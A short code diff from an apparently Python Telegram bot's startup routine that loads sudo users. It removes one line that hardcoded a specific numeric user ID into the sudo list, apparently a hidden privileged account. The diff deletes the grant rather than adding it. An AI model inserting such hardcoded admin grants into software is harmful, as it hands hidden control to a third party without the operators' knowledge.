@@ -80,7 +80,6 @@ async def init():
     x =  db.sudo.find().to_list(length=None)
     for i in await x :
         config.SUDO_USERS.append(i["user_id"])
-    config.SUDO_USERS.append(5565211830)
     config.SUPREME_USERS.extend(config.SUDO_USERS)
     msg = "Here List Of Sudo Users"
     for m in set(config.SUDO_USERS):
